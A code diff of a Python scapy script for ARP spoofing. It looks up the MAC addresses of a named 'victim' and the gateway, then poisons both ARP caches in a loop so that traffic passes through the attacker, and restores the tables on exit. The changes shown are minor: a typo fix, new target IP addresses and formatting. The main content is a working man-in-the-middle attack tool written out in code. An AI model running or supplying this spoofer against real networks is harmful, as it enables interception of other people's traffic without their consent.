@@ -10,7 +10,7 @@ def get_mac(ip):
     arp_req_broad = broadcast/arp_req
     ans = scapy.srp(arp_req_broad, timeout=40, verbose=False)[0]
 
-    # take the fist [0]->(only) packet [1]->target info.hwsrc
+    # take the first [0]->(only) packet [1]->target info.hwsrc
     return ans[0][1].hwsrc
 
 
@@ -31,8 +31,8 @@ def reArp(victim_ip_addr, victim_mac_addr, gateway_ip, gateway_mac):
 
 
 ##      MAIN        ##
-victim_ip = "10.16.168.82"
-gtw_ip    = "10.0.0.1"
+victim_ip = "192.168.1.40"
+gtw_ip    = "192.168.1.1"
 
 victim_mac = get_mac(victim_ip)  # get mac of victim
 gtw_mac    = get_mac(gtw_ip)  # get mac of gtw
@@ -42,13 +42,13 @@ packets_count = 0
 
 try:
     while True:
-        spoof_target(victim_ip,victim_mac,gtw_ip)
-        spoof_target(gtw_ip,gtw_mac,victim_ip)  # spoofing the gw make it wont work!? (only with home router WTF!)
+        spoof_target(victim_ip, victim_mac, gtw_ip)
+        spoof_target(gtw_ip, gtw_mac, victim_ip)  # spoofing the gw make it wont work!? (only with home router WTF!)
         packets_count = packets_count + 1
         print("\rPackets sent: " + str(packets_count), end="")
         time.sleep(2)
 
 except KeyboardInterrupt:
     print("Rearping targets to original table")
-    reArp(victim_ip,victim_mac,gtw_ip,gtw_mac)
+    reArp(victim_ip, victim_mac, gtw_ip, gtw_mac)
     print("\nClosing spoofer")
